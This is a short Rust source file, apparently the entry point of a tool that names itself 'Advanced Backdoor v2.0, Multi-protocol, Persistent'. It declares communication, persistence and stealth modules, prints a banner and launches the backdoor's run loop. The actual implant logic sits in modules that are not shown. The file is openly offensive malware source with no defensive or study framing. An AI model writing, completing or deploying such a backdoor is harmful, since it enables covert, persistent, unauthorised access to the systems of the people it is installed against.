mod config;
mod communication;
mod persistence;
mod stealth;
mod modules;
mod core;

#[tokio::main]
async fn main() {
    println!("
    ╔══════════════════════════════════════════╗
    ║      Advanced Backdoor v2.0              ║
    ║      Multi-protocol, Persistent          ║
    ╚══════════════════════════════════════════╝
    ");

    let mut backdoor = match core::AdvancedBackdoor::new().await {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[!] Backdoor initialization failed: {}", e);
            std::process::exit(1);
        }
    };

    if backdoor.running {
        backdoor.run().await;
    } else {
        eprintln!("[!] Backdoor initialization failed");
        std::process::exit(1);
    }
}